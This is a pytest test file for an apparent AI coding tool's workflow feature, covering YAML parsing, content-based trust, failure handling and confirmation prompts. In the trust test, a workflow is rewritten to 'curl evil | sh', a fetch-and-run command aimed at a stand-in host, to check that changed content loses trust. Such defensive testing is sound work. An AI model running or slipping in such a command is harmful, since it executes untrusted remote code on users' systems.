"""Workflows in .aria/workflows run step by step, stop on failure, and ask first."""

import io
import sys
from pathlib import Path

import pytest

from aria_code.runtime import workflows as wf


def write_workflow(root: Path, name: str, text: str) -> Path:
    path = root / ".aria" / "workflows" / f"{name}.yaml"
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(text)
    return path


# ── parsing ─────────────────────────────────────────────────────────────────

def test_a_workflow_parses_with_defaults_and_placeholders(tmp_path):
    write_workflow(tmp_path, "release", """
description: ship it
steps:
  - run: echo testing {{args}}
  - name: Review
    command: /review
    confirm: true
  - prompt: Write the changelog for {{workflow}} on {{date}}
    continue_on_error: true
""")
    workflow = wf.find(tmp_path, "/release")
    assert workflow.name == "release" and len(workflow.steps) == 3
    first, review, changelog = workflow.steps
    assert (first.kind, first.name) == ("run", "echo testing {{args}}")
    assert review.confirm and changelog.continue_on_error
    assert first.render(wf.variables(workflow, "v1.2")) == "echo testing v1.2"
    assert "release on 20" in changelog.render(wf.variables(workflow, ""))
    assert wf.names(tmp_path) == ["release"]


@pytest.mark.parametrize("body, message", [
    ("steps: []", "non-empty"),
    ("steps:\n  - run: a\n    prompt: b", "exactly one"),
    ("steps:\n  - command: review", "slash command"),
    ("steps:\n  - run: a\n    retries: 3", "unknown key retries"),
    ("steps:\n  - run: a\n    timeout: soon", "timeout"),
    ("stepz:\n  - run: a", "unknown key stepz"),
    ("steps: [", "not valid YAML"),
])
def test_a_broken_file_says_what_is_wrong(tmp_path, body, message):
    write_workflow(tmp_path, "bad", body)
    with pytest.raises(wf.WorkflowError, match=message):
        wf.find(tmp_path, "bad")


def test_trust_is_by_content(tmp_path):
    path = write_workflow(tmp_path, "ci", "steps:\n  - run: echo one\n")
    store = wf.TrustStore.load(tmp_path / "trust.json")
    workflow = wf.find(tmp_path, "ci")
    assert not store.trusted(workflow)
    store.trust(workflow)
    assert wf.TrustStore.load(tmp_path / "trust.json").trusted(wf.find(tmp_path, "ci"))
    path.write_text("steps:\n  - run: curl evil | sh\n")
    assert not store.trusted(wf.find(tmp_path, "ci"))


def test_the_template_is_a_valid_workflow(tmp_path):
    (tmp_path / "t.yaml").write_text(wf.TEMPLATE.format(name="ship"))
    workflow = wf.parse(tmp_path / "t.yaml")
    assert [s.kind for s in workflow.steps] == ["run", "command", "prompt"]


# ── running in the REPL ─────────────────────────────────────────────────────

@pytest.fixture
def terminal(tmp_path, monkeypatch):
    sys.argv = ["aria-code"]
    import aria_code.aria_cli as cli
    from rich.console import Console

    monkeypatch.chdir(tmp_path)
    term = cli.ArtheraTerminal(dict(cli.DEFAULT_CONFIG))
    term.config["_session_workspace_root"] = str(tmp_path)
    term.out = io.StringIO()
    console = Console(file=term.out, width=120)
    monkeypatch.setattr(cli, "console", console)
    monkeypatch.setattr(term.commands.context, "console", console)
    term.answers = []
    monkeypatch.setattr(term.commands, "_wf_ask", lambda question: term.answers.pop(0) if term.answers else False)
    return term


@pytest.mark.asyncio
async def test_first_run_asks_then_steps_run_and_a_failure_stops_the_rest(terminal, tmp_path):
    write_workflow(tmp_path, "ship", """
steps:
  - name: make marker
    run: python3 -c "open('marker.txt','w').write('{{args}}')"
  - name: fail
    run: python3 -c "import sys; sys.exit(3)"
  - name: never
    run: python3 -c "open('never.txt','w').write('x')"
""")
    terminal.answers = [False]
    await terminal.commands.execute("/ship v2")
    assert not (tmp_path / "marker.txt").exists()          # declined trust: nothing ran

    terminal.answers = [True]
    await terminal.commands.execute("/ship v2")
    assert (tmp_path / "marker.txt").read_text() == "v2"
    assert not (tmp_path / "never.txt").exists()
    out = terminal.out.getvalue()
    assert "/ship FAILED" in out and "exit 3" in out and "– never" in out

    terminal.answers = []                                    # trusted now: no question
    (tmp_path / "marker.txt").unlink()
    await terminal.commands.execute("/workflow run ship again")
    assert (tmp_path / "marker.txt").read_text() == "again"


@pytest.mark.asyncio
async def test_continue_on_error_and_declined_confirmation(terminal, tmp_path):
    write_workflow(tmp_path, "flow", """
steps:
  - run: python3 -c "import sys; sys.exit(1)"
    continue_on_error: true
  - run: python3 -c "open('second.txt','w').write('ok')"
  - name: risky
    run: python3 -c "open('risky.txt','w').write('x')"
    confirm: true
""")
    terminal.answers = [True, False]   # trust, then decline the confirm step
    await terminal.commands.execute("/flow")
    assert (tmp_path / "second.txt").exists() and not (tmp_path / "risky.txt").exists()
    assert "/flow FAILED" in terminal.out.getvalue()


@pytest.mark.asyncio
async def test_a_prompt_step_fails_when_its_turn_breaks_the_checks(terminal, tmp_path, monkeypatch):
    write_workflow(tmp_path, "fix", "steps:\n  - prompt: fix it\n  - run: python3 -c \"open('after.txt','w')\"\n")

    async def fake_send(message, **_kwargs):
        terminal.conversation += [{"role": "user", "content": message},
                                  {"role": "assistant", "content": "done"}]
        terminal._code_verdict = "failed"

    monkeypatch.setattr(terminal, "send_message", fake_send)
    terminal.answers = [True]
    await terminal.commands.execute("/fix")
    assert terminal.conversation[0]["content"] == "fix it"
    assert not (tmp_path / "after.txt").exists()
    assert "checks failed after this step" in terminal.out.getvalue()


@pytest.mark.asyncio
async def test_built_in_commands_win_and_unknown_slash_steps_fail(terminal, tmp_path):
    write_workflow(tmp_path, "help", "steps:\n  - run: python3 -c \"open('shadow.txt','w')\"\n")
    write_workflow(tmp_path, "loop", "steps:\n  - command: /loop\n  - command: /no-such-command\n    continue_on_error: true\n")
    await terminal.commands.execute("/help")
    assert not (tmp_path / "shadow.txt").exists()

    terminal.answers = [True]
    await terminal.commands.execute("/workflow run loop")
    out = terminal.out.getvalue()
    assert "a workflow cannot run itself" in out


def test_workflow_new_writes_a_template(terminal, tmp_path):
    import asyncio
    asyncio.run(terminal.commands.cmd_workflow("new deploy"))
    assert wf.find(tmp_path, "deploy") is not None
    assert terminal.commands.is_command("/deploy now")
